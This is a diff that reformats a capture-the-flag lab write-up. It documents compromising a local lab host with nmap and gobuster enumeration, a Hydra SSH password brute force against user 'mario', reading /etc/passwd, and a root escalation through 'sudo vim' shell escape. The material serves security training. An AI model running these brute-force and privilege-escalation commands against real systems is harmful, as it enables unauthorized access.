@@ -21,46 +21,59 @@ We started with a full TCP port scan:
 ```bash
 sudo nmap -p- -sC -sV --open --min-rate 1000 172.17.0.2
 
-The scan revealed two relevant services:
+```
 
+## The scan revealed two relevant services:
+
+```text
 22/tcp  SSH
 80/tcp  HTTP
+```
 
 Since SSH requires valid credentials, the HTTP service became the primary enumeration target.
 
-2. Web Enumeration
-WhatWeb
+## 2. Web Enumeration
+
+### WhatWeb
 
 We first used WhatWeb to identify technologies and information exposed by the web server:
 
+```bash
 whatweb http://172.17.0.2
+```
 
 The target appeared to be running a default Apache2 web page.
 
 We then inspected the HTTP response directly:
 
+```bash
 curl -s http://172.17.0.2
+```
 
 No significant additional information was found.
 
-Gobuster
+### Gobuster
 
 We continued with directory and file enumeration:
 
+```bash
 gobuster dir \
 -u http://172.17.0.2 \
 -w /usr/share/wordlists/dirb/big.txt \
 -x php,txt,bak,old \
 --exclude-length 10701
-
+```
 A larger wordlist was used because the smaller common.txt wordlist did not provide useful results.
 
 Several potentially interesting file extensions were also tested:
 
+```text
 php
 txt
 bak
 old
+```
+
 Wildcard response
 
 During enumeration, nonexistent resources returned the same response size:
@@ -77,10 +90,10 @@ This allowed us to filter the generic response and identify actual resources.
 
 secret.php
 
-Gobuster discovered:
-
+### Gobuster discovered:
+```text
 /secret.php
-
+```
 The page displayed:
 
 "Esta pagina no se puede hackear Mario!"
@@ -96,18 +109,19 @@ SSH Credential Attack
 
 Since SSH was exposed and we had a potential username, we tested the hypothesis using Hydra:
 
+```bash
 hydra -l mario \
 -P /usr/share/wordlists/rockyou.txt \
 ssh://172.17.0.2
-
+```
 Hydra identified valid SSH credentials for the mario account.
 
 The password is intentionally omitted from this public write-up.
 
 We then authenticated through SSH:
-
+```bash
 ssh mario@172.17.0.2
-
+```
 This provided our initial shell on the target.
 
 4. Post-Exploitation
@@ -121,17 +135,18 @@ This is a basic terminal environment adjustment that improves compatibility when
 Host and User Enumeration
 
 We identified our current context:
-
+```bash
 whoami
 id
 hostname
 pwd
-
+```
 We then collected operating system and kernel information:
 
+```bash
 uname -a
 cat /etc/os-release
-
+```
 This provided information about:
 
 Current user
@@ -147,10 +162,10 @@ We searched for accounts with interactive shells:
 cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
 
 The relevant accounts included:
-
+```text
 root
 mario
-
+```
 We also inspected the /home directory:
 
 ls -la /home
@@ -167,27 +182,28 @@ This provided a direct privilege escalation path.
 6. Network Enumeration
 
 As part of the post-exploitation workflow, we also inspected the target's network configuration:
-
+```bash
 ip a
 ip route
 ss -lntup
-
+```
 This provided information about:
 
 Network interfaces
 IP addresses
 Routing
 Locally listening services
+
 7. Local File Enumeration
 
 We performed basic enumeration of the user's home directory:
-
+```bash
 ls -la ~
-
+```
 We also searched for files within /home:
-
+```bash
 find /home -maxdepth 3 -type f 2>/dev/null
-
+```
 No additional path was required for the final privilege escalation.
 
 8. Privilege Escalation
@@ -201,24 +217,24 @@ with elevated privileges.
 Vim provides a shell escape functionality, which can be used to execute commands from within the editor.
 
 One method is:
-
+```bash
 sudo vim -c ':!/bin/sh'
-
+```
 Alternatively:
-
+```bash
 sudo vim
 
 Then, inside Vim:
 
 :!/bin/sh
-
+```
 We verified the resulting privileges:
-
+```bash
 whoami
 id
 pwd
 hostname
-
+```
 The resulting shell had root privileges.
 
 9. Attack Path
@@ -250,8 +266,10 @@ Vim shell escape
     │
     ▼
 ROOT
+
 10. Lessons Learned
-Reconnaissance
+
+### Reconnaissance
 Full port enumeration helps identify the available attack surface.
 When one service requires credentials, another exposed service may provide useful information.
 Web Enumeration
